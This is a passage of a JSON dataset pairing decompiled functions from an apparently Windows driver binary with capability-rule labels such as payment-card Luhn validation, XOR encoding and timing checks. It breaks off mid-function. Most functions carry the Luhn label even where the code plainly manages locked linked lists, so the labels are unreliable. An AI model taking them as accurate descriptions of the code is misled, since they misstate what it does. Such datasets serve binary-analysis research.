        "decompiled_code": "\nulong fcn.00031a34(uint8_t *arg1, ulong arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint8_t uVar3;\n    ulong uVar4;\n    uint8_t *puVar5;\n    \n    uVar3 = 0;\n    iVar2 = 0;\n    uVar4 = 1;\n    while( true ) {\n        puVar5 = arg1;\n        uVar1 = *puVar5;\n        if ((((uVar1 < 0x41) || (0x5a < uVar1)) && ((uVar1 < 0x61 || (0x7a < uVar1)))) &&\n           ((uVar1 < 0x30 || (0x39 < uVar1)))) break;\n        iVar2 = iVar2 + 1;\n        uVar3 = uVar3 + uVar1;\n        arg1 = puVar5 + 1;\n        if (7 < iVar2) {\n            if ((puVar5[1] != uVar3 / 0x1a + 0x41) || (puVar5[2] != 0x7a - uVar3 % 0x1a)) {\n                uVar4 = 0;\n            }\n            return uVar4;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 294
    },
    "00031aac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00031aac(uint8_t *arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    ulong uVar3;\n    uint8_t *puVar4;\n    uint8_t uVar5;\n    \n    uVar5 = 0;\n    iVar1 = 0;\n    uVar3 = 1;\n    while( true ) {\n        puVar4 = arg1;\n        uVar2 = *puVar4;\n        if (uVar2 + 0xbf < 0x1a) {\n            uVar2 = uVar2 + 0x20;\n        }\n        if (0x19 < uVar2 + 0x9f) break;\n        iVar1 = iVar1 + 1;\n        uVar5 = uVar5 + uVar2;\n        arg1 = puVar4 + 1;\n        if (7 < iVar1) {\n            if ((puVar4[1] != uVar5 / 0x1a + 0x61) || (puVar4[2] != 0x7a - uVar5 % 0x1a)) {\n                uVar3 = 0;\n            }\n            return uVar3;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 279
    },
    "00031b20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encode data using XOR"
        ],
        "decompiled_code": "\nint64_t fcn.00031b20(uint32_t *arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    int64_t arg1_00;\n    uint *puVar2;\n    int64_t iVar3;\n    uint uStackX24;\n    uint uStackX28;\n    \n    arg1_00 = fcn.0002fbc4(0x1a);\n    if (arg1_00 != 0) {\n        fcn.00031878(arg1_00);\n        uStackX24 = fcn.0002fcf4(*arg1);\n        uStackX28 = fcn.0002fcf4(arg1[1]);\n        puVar2 = &uStackX24;\n        iVar3 = 8;\n        do {\n            *puVar2 = *puVar2 ^ *((arg1_00 - &uStackX24) + puVar2);\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n        iVar1 = fcn.0002eed8(&uStackX24, arg1_00 + 10, 8);\n        *(arg2 + 8) = arg1_00;\n        *(arg2 + 0x10) = iVar1 + 10;\n        arg1_00 = 1;\n    }\n    return arg1_00;\n}\n",
        "token_count": 310
    },
    "00031bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00031bb0(void)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong auStackX8 [4];\n    uint auStack280 [2];\n    ulong uStack272;\n    uchar *puStack264;\n    uint uStack256;\n    ulong uStack248;\n    ulong uStack240;\n    uchar auStack232 [16];\n    uchar auStack216 [208];\n    \n    fcn.000285f0(auStack216, 100);\n    fcn.000619f0(auStack232, auStack216);\n    puStack264 = auStack232;\n    auStack280[0] = 0x30;\n    uStack272 = 0;\n    uStack256 = 0;\n    uStack248 = 0;\n    uStack240 = 0;\n    uVar2 = fcn.00061aec(auStackX8, 2, auStack280);\n    if (uVar2 == 0) {\n        uVar1 = fcn.00061bac(auStackX8[0], 0);\n        uVar2 = uVar1;\n        fcn.000619de(auStackX8[0]);\n    }\n    return uVar2;\n}\n",
        "token_count": 272
    },
    "00031c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00031c40(ulong arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00061ad4(arg1, 0x141c0);\n    if ((((iVar1 != 0) && (iVar1 = fcn.00061ad4(arg1, 0x141b0),  iVar1 != 0)) &&\n        (iVar1 = fcn.00061ad4(arg1, 0x141a0),  iVar1 != 0)) &&\n       (((iVar1 = fcn.00061ad4(arg1, 0x14190),  iVar1 != 0 && (iVar1 = fcn.00061ad4(arg1, 0x14180),  iVar1 != 0)) &&\n        (iVar1 = fcn.00061ad4(arg1, 0x14170),  iVar1 != 0)))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 211
    },
    "00031ccc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00031ccc(ulong arg1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00061a32(arg1, 0x14250);\n    if ((((iVar1 != 0) && (iVar1 = fcn.00061a32(arg1, 0x14238),  iVar1 != 0)) &&\n        (iVar1 = fcn.00061a32(arg1, 0x14220),  iVar1 != 0)) &&\n       (((iVar1 = fcn.00061a32(arg1, 0x14200),  iVar1 != 0 && (iVar1 = fcn.00061a32(arg1, 0x141e8),  iVar1 != 0)) &&\n        (iVar1 = fcn.00061a32(arg1, 0x141d0),  iVar1 != 0)))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 209
    },
    "00031dac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t fcn.00031dac(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int16_t *piVar3;\n    int64_t iVar4;\n    \n    iVar2 = 0;\n    piVar3 = 0x7afd8;\n    iVar4 = 10;\n    do {\n        iVar1 = *piVar3;\n        piVar3 = piVar3 + 1;\n        iVar2 = iVar2 + (iVar1 != 0);\n        iVar4 = iVar4 + -1;\n    } while (iVar4 != 0);\n    return iVar2;\n}\n",
        "token_count": 134
    },
    "00031ec4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00031ec4(void)\n\n{\n    int32_t iVar1;\n    ulong auStackX8 [4];\n    \n    iVar1 = fcn.0002f96c(0x14570, auStackX8);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004afbc(auStackX8[0], 0x14550, 0x7aff0);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0004afbc(auStackX8[0], 0x14538, 0x7aff8);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0004afbc(auStackX8[0], 0x14518, 0x7b000);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.0004afbc(auStackX8[0], 0x144f8, 0x7b008);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.0004afbc(auStackX8[0], 0x144d8, 0x7b010);\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.0004afbc(auStackX8[0], 0x144c0, 0x7b018);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.0004afbc(auStackX8[0], 0x144a8, 0x7b020);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.0004afbc(auStackX8[0], 0x14498, 0x7b028);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.0004afbc(auStackX8[0], 0x14480, 0x7b030);\n                                        if (iVar1 == 0) {\n                                            iVar1 = fcn.0004afbc(auStackX8[0], 0x14468, 0x7b038);\n                                            if (iVar1 == 0) {\n                                                iVar1 = fcn.0004afbc(auStackX8[0], 0x14450, 0x7b040);\n                                                if (iVar1 == 0) {\n                                                    iVar1 = fcn.0004afbc(auStackX8[0], 0x14440, 0x7b048);\n                                                    if (iVar1 == 0) {\n                                                        iVar1 = fcn.0004afbc(auStackX8[0], 0x14428, 0x7b050);\n                                                        if (iVar1 == 0) {\n                                                            iVar1 = fcn.0004afbc(auStackX8[0], 0x14408, 0x7b058);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004afbc(auStackX8[0], 0x143e0, 0x7b060);\n                                                                if (iVar1 == 0) {\n                                                                    iVar1 = fcn.0004afbc(auStackX8[0], 0x143c0, 0x7b068)\n                                                                    ;\n                                                                    if (iVar1 == 0) {\n                                                                        iVar1 = fcn.0004afbc(auStackX8[0], 0x143a0, \n                                                                                             0x7b070);\n                                                                        if (iVar1 == 0) {\n                                                                            iVar1 = fcn.0004afbc(auStackX8[0], 0x14380, \n                                                                                                 0x7b078);\n                                                                            if (iVar1 == 0) {\n                                                                                iVar1 = fcn.0004afbc(auStackX8[0], \n                                                                                                     0x14360, 0x7b080);\n                                                                                if (iVar1 == 0) {\n                                                                                    iVar1 = fcn.0004afbc(auStackX8[0], \n                                                                                                         0x14340, \n                                                            0x88ae0);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004afbc(auStackX8[0], 0x14320, 0x88b10);\n                                                                if (iVar1 == 0) {\n                                                                    iVar1 = fcn.0004afbc(auStackX8[0], 0x14300, 0x88af8)\n                                                                    ;\n                                                                    if (iVar1 == 0) {\n                                                                        iVar1 = fcn.0004afbc(auStackX8[0], 0x142e0, \n                                                                                             0x88b18);\n                                                                        if (iVar1 == 0) {\n                                                                            iVar1 = fcn.0004afbc(auStackX8[0], 0x142c8, \n                                                                                                 0x88ae8);\n                                                                            if (iVar1 == 0) {\n                                                                                iVar1 = fcn.0004afbc(auStackX8[0], \n                                                                                                     0x142b0, 0x88af0);\n                                                                                if (iVar1 == 0) {\n                                                                                    iVar1 = fcn.0004afbc(auStackX8[0], \n                                                                                                         0x14290, \n                                                            0x88b08);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004afbc(auStackX8[0], 0x14270, 0x88b00);\n                                                                if (iVar1 == 0) {\n                                                                    fcn.0004afbc(auStackX8[0], 0x142b0, 0x88af0);\n                                                                }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1328
    },
    "00032250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00032250(void)\n\n{\n    int32_t iVar1;\n    ulong auStackX8 [4];\n    \n    iVar1 = fcn.0002f96c(0x14808, auStackX8);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0004afbc(auStackX8[0], 0x147e8, 0x7b088);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0004afbc(auStackX8[0], 0x147c8, 0x7b090);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0004afbc(auStackX8[0], 0x147b0, 0x7b098);\n                if (iVar1 == 0) {\n                    iVar1 = fcn.0004afbc(auStackX8[0], 0x14798, 0x7b0a0);\n                    if (iVar1 == 0) {\n                        iVar1 = fcn.0004afbc(auStackX8[0], 0x14780, 0x7b0a8);\n                        if (iVar1 == 0) {\n                            iVar1 = fcn.0004afbc(auStackX8[0], 0x14768, 0x7b0b0);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.0004afbc(auStackX8[0], 0x14758, 0x7b0b8);\n                                if (iVar1 == 0) {\n                                    iVar1 = fcn.0004afbc(auStackX8[0], 0x14738, 0x7b0c0);\n                                    if (iVar1 == 0) {\n                                        iVar1 = fcn.0004afbc(auStackX8[0], 0x14728, 0x7b0c8);\n                                        if (iVar1 == 0) {\n                                            iVar1 = fcn.0004afbc(auStackX8[0], 0x14710, 0x7b0d0);\n                                            if (iVar1 == 0) {\n                                                iVar1 = fcn.0004afbc(auStackX8[0], 0x146f8, 0x7b0d8);\n                                                if (iVar1 == 0) {\n                                                    iVar1 = fcn.0004afbc(auStackX8[0], 0x146e8, 0x7b0e0);\n                                                    if (iVar1 == 0) {\n                                                        iVar1 = fcn.0004afbc(auStackX8[0], 0x146d0, 0x7b0e8);\n                                                        if (iVar1 == 0) {\n                                                            iVar1 = fcn.0004afbc(auStackX8[0], 0x146b0, 0x7b0f0);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004afbc(auStackX8[0], 0x14690, 0x7b0f8);\n                                                                if (iVar1 == 0) {\n                                                                    iVar1 = fcn.0004afbc(auStackX8[0], 0x14678, 0x7b100)\n                                                                    ;\n                                                                    if (iVar1 == 0) {\n                                                                        iVar1 = fcn.0004afbc(auStackX8[0], 0x14660, \n                                                                                             0x7b108);\n                                                                        if (iVar1 == 0) {\n                                                                            iVar1 = fcn.0004afbc(auStackX8[0], 0x14638, \n                                                                                                 0x7b110);\n                                                                            if (iVar1 == 0) {\n                                                                                iVar1 = fcn.0004afbc(auStackX8[0], \n                                                                                                     0x14618, 0x88ac0);\n                                                                                if (iVar1 == 0) {\n                                                                                    iVar1 = fcn.0004afbc(auStackX8[0], \n                                                                                                         0x14608, \n                                                            0x88ab0);\n                                                            if (iVar1 == 0) {\n                                                                iVar1 = fcn.0004afbc(auStackX8[0], 0x145e8, 0x88ab8);\n                                                                if (iVar1 == 0) {\n                                                                    iVar1 = fcn.0004afbc(auStackX8[0], 0x145c8, 0x88ac8)\n                                                                    ;\n                                                                    if (iVar1 == 0) {\n                                                                        iVar1 = fcn.0004afbc(auStackX8[0], 0x145a8, \n                                                                                             0x88ad8);\n                                                                        if (iVar1 == 0) {\n                                                                            iVar1 = fcn.0004afbc(auStackX8[0], 0x14590, \n                                                                                                 0x88ad0);\n                                                                            if (iVar1 == 0) {\n                                                                                iVar1 = fcn.0004afbc(auStackX8[0], \n                                                                                                     0x146b0, 0x7b0f0);\n                                                                                if (iVar1 == 0) {\n                                                                                    fcn.0004afbc(auStackX8[0], 0x14580, \n                                                                                                 0x88aa8);\n                                                                                }\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                            }\n                                                        }\n                                                    }\n                                                }\n                                            }\n                                        }\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 1263
    },
    "00032788": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00032788(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x7b140;\n    if (arg2 == 0) {\n        fcn.00031564(0x7b148, auStackX24, 0);\n        puVar1 = *0x7b140;\n    }\n    for (; (puVar1 != NULL && (puVar1[3] != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00031598(0x7b148, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 169
    },
    "0003284c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0003284c(int64_t *arg1)\n\n{\n    int64_t **ppiVar1;\n    int32_t iVar2;\n    ulong uVar3;\n    int64_t **ppiVar4;\n    int64_t **ppiVar5;\n    int64_t **ppiVar6;\n    uchar auStackX8 [32];\n    \n    ppiVar6 = NULL;\n    ppiVar4 = NULL;\n    if (arg1 == NULL) {\n        uVar3 = 0xc00000ef;\n    }\n    else {\n        fcn.00031564(0x7b148, auStackX8, 0);\n        ppiVar5 = *0x7b140;\n        if (*0x7b140 != NULL) {\n            do {\n                if (ppiVar5[3] == arg1) break;\n                ppiVar5 = *ppiVar5;\n            } while (ppiVar5 != NULL);\n            if (ppiVar5 != NULL) {\n                ppiVar6 = ppiVar5 + 6;\n                ppiVar4 = ppiVar5 + 5;\n            }\n        }\n        fcn.00031598(0x7b148, auStackX8, 0);\n        if (ppiVar5 == NULL) {\n            uVar3 = 0xc000000d;\n        }\n        else {\n            iVar2 = fcn.00052250(ppiVar4);\n            if (iVar2 == 0) {\n                fcn.00052250(ppiVar6);\n            }\n            fcn.00031564(0x7b148, auStackX8, 0);\n            ppiVar4 = NULL;\n            ppiVar5 = *0x7b140;\n            ppiVar6 = *0x7b140;\n            ppiVar1 = *0x7b140;\n            if (*0x7b140 != NULL) {\n                do {\n                    ppiVar6 = ppiVar5;\n                    if (ppiVar5[3] == arg1) break;\n                    ppiVar6 = *ppiVar5;\n                    ppiVar4 = ppiVar5;\n                    ppiVar5 = ppiVar6;\n                } while (ppiVar6 != NULL);\n                if ((ppiVar6 != NULL) && (ppiVar1 = *ppiVar6,  ppiVar4 != NULL)) {\n                    *ppiVar4 = *ppiVar6;\n                    ppiVar1 = *0x7b140;\n                }\n            }\n            *0x7b140 = ppiVar1;\n            fcn.00031598(0x7b148, auStackX8, 0);\n            fcn.0002fc50(ppiVar6);\n            uVar3 = 0;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 608
    },
    "00032950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00032950(int64_t *arg1)\n\n{\n    int64_t arg1_00;\n    int32_t iVar1;\n    ulong uVar2;\n    ulong unaff_RBX;\n    int64_t **ppiVar3;\n    int64_t **ppiVar4;\n    ulong unaff_RBP;\n    int64_t **arg3;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    int64_t **arg3_00;\n    ulong in_R9;\n    ulong unaff_R12;\n    bool bVar5;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    \n    arg3 = NULL;\n    fcn.00031564(0x7b148, &stack0x00000010, 0);\n    LOCK();\n    bVar5 = *0x7b2f0 == 0;\n    *0x7b2f0 = *0x7b2f0 ^ bVar5 * *0x7b2f0;\n    ppiVar3 = *0x7b140;\n    ppiVar4 = arg3;\n    arg3_00 = arg3;\n    if (!bVar5) {\n        for (; (ppiVar3 != NULL && (ppiVar3[3] != arg1)); ppiVar3 = *ppiVar3) {\n        }\n        ppiVar4 = ppiVar3;\n        if (ppiVar3 != NULL) {\n            arg3_00 = ppiVar3 + 6;\n            arg3 = ppiVar3 + 5;\n        }\n    }\n    fcn.00031598(0x7b148, &stack0x00000010, 0);\n    if (ppiVar4 == NULL) {\n        return 0xc000000d;\n    }\n    if ((*arg3_00 == NULL) && (*arg3 == NULL)) {\n        if (arg1[9] == 0) {\n            return 0xc0000001;\n        }\n        arg1_00 = *(*0x7b334 + arg1[9]);\n        if ((arg1_00 != 0) &&\n           (uVar2 = fcn.00051f30(arg1_00, 0x3259c, arg3_00, in_R9, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, unaff_RBX\n                                 , in_stack_00000000, in_stack_00000008, in_stack_00000010, in_stack_00000018, \n                                 in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                                 in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                                 in_stack_00000060, in_stack_00000068, in_stack_00000070),  uVar2 != 0)) {\n            return uVar2;\n        }\n        iVar1 = fcn.00051f30(*(*0x88a48 + arg1), 0x325e8, arg3, in_R9, unaff_R12, unaff_RDI, unaff_RSI, unaff_RBP, \n                             unaff_RBX, in_stack_00000000, in_stack_00000008, in_stack_00000010, in_stack_00000018, \n                             in_stack_00000020, in_stack_00000028, in_stack_00000030, in_stack_00000038, \n                             in_stack_00000040, in_stack_00000048, in_stack_00000050, in_stack_00000058, \n                             in_stack_00000060, in_stack_00000068, in_stack_00000070);\n        if (iVar1 != 0) {\n            fcn.00052250(arg3_00);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 977
    },
    "00032a40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00032a40(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    int64_t iVar1;\n    ulong *puVar2;\n    ulong uVar3;\n    bool bVar4;\n    uchar auStackX32 [8];\n    \n    uVar3 = 0;\n    iVar1 = fcn.00032788(arg3, 0);\n    if (iVar1 == 0) {\n        puVar2 = fcn.0002fbf0(0x38);\n        if (puVar2 == NULL) {\n            uVar3 = 0xc000009a;\n        }\n        else {\n            fcn.00061a56(puVar2);\n            puVar2[3] = arg3;\n            puVar2[1] = arg1;\n            puVar2[2] = arg2;\n            fcn.00031564(0x7b148, auStackX32, 1);\n            LOCK();\n            bVar4 = *0x7b2f0 == 0;\n            *0x7b2f0 = *0x7b2f0 ^ bVar4 * *0x7b2f0;\n            if (bVar4) {\n                uVar3 = 0x21590006;\n            }\n            else {\n                *puVar2 = *0x7b140;\n                *0x7b140 = puVar2;\n            }\n            fcn.00031598(0x7b148, auStackX32, 1);\n        }\n    }\n    else {\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 356
    },
    "00032e50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00032e50(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x7b1e0;\n    if (arg2 == 0) {\n        fcn.00031564(0x7b1c0, auStackX24, 0);\n        puVar1 = *0x7b1e0;\n    }\n    for (; (puVar1 != NULL && (puVar1[6] != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00031598(0x7b1c0, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 178
    },
    "00032eb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong * fcn.00032eb0(int64_t arg1, ulong arg2)\n\n{\n    ulong *puVar1;\n    uchar auStackX24 [16];\n    \n    puVar1 = *0x7b1e0;\n    if (arg2 == 0) {\n        fcn.00031564(0x7b1c0, auStackX24, 0);\n        puVar1 = *0x7b1e0;\n    }\n    for (; (puVar1 != NULL && (puVar1[5] != arg1)); puVar1 = *puVar1) {\n    }\n    if (arg2 == 0) {\n        fcn.00031598(0x7b1c0, auStackX24, 0);\n    }\n    return puVar1;\n}\n",
        "token_count": 178
    },
    "000332b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.000332b4(ulong arg1, ulong arg2, int64_t arg3)\n\n{\n    ulong *arg1_00;\n    int32_t iVar1;\n    int64_t *piVar2;\n    uchar auStackX32 [8];\n    \n    arg1_00 = fcn.0002fbf0(0x38);\n    if (arg1_00 == NULL) {\n        return -0x3fffff66;\n    }\n    fcn.00061a56(arg1_00);\n    arg1_00[6] = arg2;\n    arg1_00[5] = arg1;\n    arg1_00[4] = arg3;\n    fcn.00031564(0x7b1c0, auStackX32, 1);\n    piVar2 = *0x7b1d8;\n    if (*0x7b1d8 != NULL) {\n        do {\n            if (piVar2[1] == arg3) break;\n            piVar2 = *piVar2;\n        } while (piVar2 != NULL);\n        if (piVar2 != NULL) {\n            arg1_00[1] = piVar2;\n            iVar1 = 0;\n            *arg1_00 = *0x7b1e0;\n            *0x7b1e0 = arg1_00;\n            goto code_r0x00033352;\n        }\n    }\n    iVar1 = -0x3fffff0f;\ncode_r0x00033352:\n    fcn.00031598(0x7b1c0, auStackX32, 1);\n    if (iVar1 != 0) {\n        fcn.0002fc50(arg1_00);\n    }\n    return iVar1;\n}\n",
        "token_count": 393
    },
    "00033380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00033380(int64_t *arg1)\n\n{\n    int64_t **ppiVar1;\n    int64_t **ppiVar2;\n    int64_t arg1_00;\n    int64_t **ppiVar3;\n    int64_t **ppiVar4;\n    ulong *puVar5;\n    int64_t *piStackX16;\n    int64_t *piStackX24;\n    int64_t *piStackX32;\n    int64_t *piStack56;\n    uchar auStack48 [8];\n    uchar auStack40 [16];\n    \n    do {\n        arg1_00 = 0;\n        fcn.00031564(0x7b1c0, &piStackX16, 0);\n        for (puVar5 = *0x7b1e0; puVar5 != NULL; puVar5 = *puVar5) {\n            if (puVar5[4] == arg1) {\n                arg1_00 = puVar5[5];\n                break;\n            }\n        }\n        fcn.00031598(0x7b1c0, &piStackX16, 0);\n        if (arg1_00 == 0) break;\n        fcn.00033210(arg1_00);\n    } while( true );\n    piStackX16 = NULL;\n    piStackX24 = NULL;\n    piStackX32 = NULL;\n    piStack56 = NULL;\n    fcn.00031564(0x7b1c0, auStack48, 1);\n    ppiVar4 = *0x7b1d8;\n    if (*0x7b1d8 != NULL) {\n        do {\n            if (ppiVar4[1] == arg1) break;\n            ppiVar4 = *ppiVar4;\n        } while (ppiVar4 != NULL);\n        if (ppiVar4 != NULL) {\n            piStackX16 = ppiVar4[3];\n            piStackX24 = ppiVar4[4];\n            piStackX32 = ppiVar4[6];\n            piStack56 = ppiVar4[5];\n            ppiVar4[6] = NULL;\n            ppiVar4[5] = NULL;\n            ppiVar4[3] = NULL;\n            ppiVar4[4] = NULL;\n        }\n    }\n    fcn.00031598(0x7b1c0, auStack48, 1);\n    fcn.00052250(&piStackX16);\n    fcn.00052250(&piStackX24);\n    fcn.00052250(&piStackX32);\n    fcn.00052250(&piStack56);\n    fcn.00031564(0x7b1c0, auStack40, 0);\n    ppiVar2 = NULL;\n    ppiVar3 = *0x7b1d8;\n    ppiVar4 = *0x7b1d8;\n    ppiVar1 = *0x7b1d8;\n    if (*0x7b1d8 != NULL) {\n        do {\n            ppiVar4 = ppiVar3;\n            if (ppiVar3[1] == arg1) break;\n            ppiVar4 = *ppiVar3;\n            ppiVar2 = ppiVar3;\n            ppiVar3 = ppiVar4;\n        } while (ppiVar4 != NULL);\n        if ((ppiVar4 != NULL) && (ppiVar1 = *ppiVar4,  ppiVar2 != NULL)) {\n            *ppiVar2 = *ppiVar4;\n            ppiVar1 = *0x7b1d8;\n        }\n    }\n    *0x7b1d8 = ppiVar1;\n    fcn.00031598(0x7b1c0, auStack40, 0);\n    if (ppiVar4 != NULL) {\n        fcn.0002fc50(ppiVar4);\n    }\n    return 0;\n}\n",
        "token_count": 876
    },
    "000337fc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000337fc(void)\n\n{\n    int64_t arg1;\n    uchar auStackX8 [32];\n    \n    while( true ) {\n        fcn.00031564(0x7b1c0, auStackX8, 0);\n        if (*0x7b1d8 == 0) {\n            arg1 = 0;\n        }\n        else {\n            arg1 = *(*0x7b1d8 + 8);\n        }\n        fcn.00031598(0x7b1c0, auStackX8, 0);\n        if (arg1 == 0) break;\n        fcn.00033380(arg1);\n    }\n    fcn.00052250(0x7b1f0);\n    fcn.00052250(0x7b1e8);\n    fcn.00052250(0x7b1f8);\n    fcn.00052250(0x7b200);\n    return;\n}\n",
        "token_count": 216
    },
    "000339c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.000339c0(int64_t arg1)\n\n{\n    char *arg1_00;\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    ulong *puVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uchar auStackX16 [24];\n    \n    pcVar8 = NULL;\n    puVar4 = fcn.0002fbf0(0x38);\n    if (puVar4 == NULL) {\n        iVar3 = -0x3fffff66;\n    }\n    else {\n        fcn.00061a56(puVar4, 0);\n        puVar4[1] = arg1;\n        puVar4[2] = *(arg1 + 0x20);\n        fcn.00031564(0x7b1c0, auStackX16, 1);\n        *puVar4 = *0x7b1d8;\n        *0x7b1d8 = puVar4;\n        fcn.00031598(0x7b1c0, auStackX16, 1);\n        iVar3 = fcn.00033884(arg1, 4);\n        if ((((iVar3 == 0) && (iVar3 = fcn.00033884(arg1, 3),  iVar3 == 0)) &&\n            (iVar3 = fcn.00033884(arg1, 0),  iVar3 == 0)) && (iVar3 = fcn.00033884(arg1, 2),  iVar3 == 0)) {\n            pcVar1 = *(arg1 + 0x18);\njoined_r0x00033a9d:\n            do {\n                do {\n                    arg1_00 = pcVar1;\n                    if (arg1_00 == NULL) {\ncode_r0x00033b67:\n                        if (iVar3 == 0) {\n                            return 0;\n                        }\n                        goto code_r0x00033b6b;\n                    }\n                    iVar3 = fcn.000332b4(arg1_00, *(arg1_00 + 0x18), arg1);\n                    if (iVar3 != 0) goto code_r0x00033b6b;\n                    pcVar1 = pcVar8;\n                } while (*0x7b1b0 == 0);\n                pcVar8 = *(arg1_00 + *0x7b1b0);\n                if (pcVar8 == arg1_00) goto code_r0x00033b67;\n                uVar6 = *0x7b1b4;\n                pcVar7 = arg1_00;\n                pcVar1 = pcVar8;\n                if 